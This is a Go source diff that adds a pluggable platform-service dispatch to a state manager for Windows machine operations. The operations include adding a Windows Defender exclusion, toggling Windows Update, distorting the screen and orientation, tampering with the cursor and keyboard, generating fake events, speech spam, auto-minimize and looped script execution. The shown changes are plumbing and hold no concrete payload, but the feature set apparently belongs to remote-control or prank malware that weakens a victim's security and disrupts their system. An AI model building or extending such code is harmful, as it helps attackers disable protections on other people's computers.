@@ -56,9 +56,11 @@ type State struct {
 }
 
 type Manager struct {
-	mu        sync.RWMutex
-	state     State
-	scriptDir string
+	mu         sync.RWMutex
+	state      State
+	scriptDir  string
+	platform   PlatformService
+	platformMu sync.RWMutex
 }
 
 func NewManager(opts ManagerOptions) *Manager {
@@ -70,6 +72,7 @@ func NewManager(opts ManagerOptions) *Manager {
 
 	return &Manager{
 		scriptDir: dir,
+		platform:  newPlatformService(),
 		state: State{
 			VisualDistortion:  "None",
 			ScreenOrientation: "Normal",
@@ -84,6 +87,63 @@ func NewManager(opts ManagerOptions) *Manager {
 			FakeEventMode: "None",
 		},
 	}
+}
+
+func (m *Manager) SetPlatformService(service PlatformService) {
+	if m == nil {
+		return
+	}
+	if service == nil {
+		service = newPlatformService()
+	}
+	m.platformMu.Lock()
+	m.platform = service
+	m.platformMu.Unlock()
+}
+
+func (m *Manager) getPlatformService() PlatformService {
+	if m == nil {
+		return nil
+	}
+
+	m.platformMu.RLock()
+	service := m.platform
+	m.platformMu.RUnlock()
+	if service != nil {
+		return service
+	}
+
+	defaultService := newPlatformService()
+	m.platformMu.Lock()
+	if m.platform == nil {
+		m.platform = defaultService
+	} else {
+		defaultService = m.platform
+	}
+	m.platformMu.Unlock()
+	return defaultService
+}
+
+func (m *Manager) invokePlatform(
+	ctx context.Context,
+	operation string,
+	metadata map[string]any,
+) (string, error) {
+	service := m.getPlatformService()
+	if service == nil {
+		return "", nil
+	}
+
+	var metaCopy map[string]any
+	if len(metadata) > 0 {
+		metaCopy = make(map[string]any, len(metadata))
+		for key, value := range metadata {
+			metaCopy[key] = value
+		}
+	}
+
+	state := m.Snapshot()
+	return service.Execute(ctx, operation, metaCopy, state)
 }
 
 func (m *Manager) Snapshot() State {
@@ -111,9 +171,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"enabled": enabled})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.DefenderExclusion = enabled
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if enabled {
 			return "Windows Defender exclusion enabled", nil
 		}
@@ -124,9 +191,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"enabled": enabled})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.WindowsUpdate = enabled
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if enabled {
 			return "Windows Update enabled", nil
 		}
@@ -137,9 +211,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"mode": mode})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.VisualDistortion = mode
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Visual distortion set to %s", mode), nil
 
 	case "screen-orientation":
@@ -147,9 +228,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"orientation": orientation})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.ScreenOrientation = orientation
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Screen orientation set to %s", orientation), nil
 
 	case "wallpaper-mode":
@@ -157,9 +245,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"mode": mode})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.WallpaperMode = mode
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Wallpaper mode set to %s", mode), nil
 
 	case "cursor-behavior":
@@ -167,9 +262,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"behavior": behavior})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.CursorBehavior = behavior
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Cursor behavior set to %s", behavior), nil
 
 	case "keyboard-mode":
@@ -177,9 +279,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"mode": mode})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.KeyboardMode = mode
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Keyboard mode set to %s", mode), nil
 
 	case "sound-playback":
@@ -187,9 +296,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"enabled": enabled})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.SoundPlayback = enabled
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if enabled {
 			return "Sound playback enabled", nil
 		}
@@ -206,9 +322,19 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if volume > 100 {
 			volume = 100
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"volume": volume})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.SoundVolume = volume
+		if volume > 0 {
+			m.state.SoundPlayback = true
+		}
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Sound volume set to %d%%", volume), nil
 
 	case "script-file":
@@ -359,6 +485,22 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 			return "", delayErr
 		}
 
+		serviceMeta := map[string]any{"mode": mode}
+		if hasLoop {
+			serviceMeta["loop"] = loop
+		}
+		if hasDelay {
+			if delay < 0 {
+				delay = 0
+			}
+			serviceMeta["delaySeconds"] = delay
+		}
+
+		platformSummary, err := m.invokePlatform(ctx, operation, serviceMeta)
+		if err != nil {
+			return "", err
+		}
+
 		m.mu.Lock()
 		m.state.Script.Mode = mode
 		if hasLoop {
@@ -371,6 +513,9 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 			m.state.Script.DelaySeconds = delay
 		}
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Script execution mode set to %s", mode), nil
 
 	case "script-loop":
@@ -378,9 +523,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"loop": loop})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.Script.Loop = loop
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if loop {
 			return "Script loop enabled", nil
 		}
@@ -394,9 +546,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if delay < 0 {
 			delay = 0
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"delaySeconds": delay})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.Script.DelaySeconds = delay
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Script delay set to %d seconds", delay), nil
 
 	case "fake-event-mode":
@@ -404,9 +563,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"mode": mode})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.FakeEventMode = mode
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		return fmt.Sprintf("Fake event mode set to %s", mode), nil
 
 	case "speech-spam":
@@ -414,9 +580,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"enabled": enabled})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.SpeechSpam = enabled
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if enabled {
 			return "Speech spam enabled", nil
 		}
@@ -427,9 +600,16 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 		if err != nil {
 			return "", err
 		}
+		platformSummary, err := m.invokePlatform(ctx, operation, map[string]any{"enabled": enabled})
+		if err != nil {
+			return "", err
+		}
 		m.mu.Lock()
 		m.state.AutoMinimize = enabled
 		m.mu.Unlock()
+		if platformSummary != "" {
+			return platformSummary, nil
+		}
 		if enabled {
 			return "Auto minimize enabled", nil
 		}
